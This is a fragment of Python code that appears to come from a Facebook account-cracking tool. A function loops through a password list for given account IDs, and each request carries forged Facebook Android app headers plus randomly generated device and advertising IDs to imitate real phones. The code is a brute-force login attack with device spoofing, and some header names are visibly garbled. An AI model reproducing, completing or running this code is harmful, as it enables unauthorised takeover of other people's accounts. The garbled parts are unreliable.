        ...
        try:
                for pas in passlist:
                        ...
                        headers={
                                ...
                                'X-FB-ConABction-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-EngiAB': 'Liger'
                                }
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua  = 'Dalvik/2.0.0 (Linux; U; Android 11; Oppo Find X3 Pro Build/RKQ1.201002.002) [FBAN/FB4A;FBAV/;{application_version};FBBV/{application_version_code};FBDM/{density=3.5,width=1440,height=3216};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Oppo;FBMF/Find X3 Pro;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Find X3 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
